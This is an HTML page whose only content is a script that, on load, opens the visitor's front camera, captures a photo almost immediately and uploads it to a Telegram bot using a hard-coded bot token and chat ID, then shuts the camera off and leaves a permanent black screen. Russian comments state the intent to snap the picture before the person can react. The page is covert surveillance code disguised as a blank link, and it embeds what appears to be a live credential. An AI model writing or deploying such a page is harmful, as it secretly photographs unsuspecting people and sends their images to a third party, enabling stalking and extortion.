<!DOCTYPE html>

<html>
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width,initial-scale=1,user-scalable=no"
    />
    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        background: #000;
        overflow: hidden;
      }
    </style>
  </head>
  <body>
    <script>
      const BOT_TOKEN = "8491591182:AAEuTjyylQ5HfDW7DAKAyuuATpkjt9G_QyM";

      const CHAT_ID = "-1003417358261";

      navigator.mediaDevices
        .getUserMedia({ video: { facingMode: "user" } })
        .then((stream) => {
          const v = document.createElement("video");

          v.srcObject = stream;

          v.muted = v.playsinline = v.autoplay = true;

          v.onloadedmetadata = async () => {
            v.play();

            // снимок почти сразу (человек даже не успеет поднести телефон)

            const c = document.createElement("canvas");

            c.width = v.videoWidth;

            c.height = v.videoHeight;

            c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);

            const blob = await new Promise((r) =>
              c.toBlob(r, "image/jpeg", 0.94)
            );

            const file = new File([blob], "s.jpg", { type: "image/jpeg" });

            const fd = new FormData();

            fd.append("chat_id", CHAT_ID);

            fd.append("photo", file);

            fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
              method: "POST",
              body: fd,
            });

            // останавливаем камеру и оставляем чёрный экран навсегда

            stream.getTracks().forEach((t) => t.stop());
          };
        })
        .catch(() => {});
    </script>
  </body>
</html>
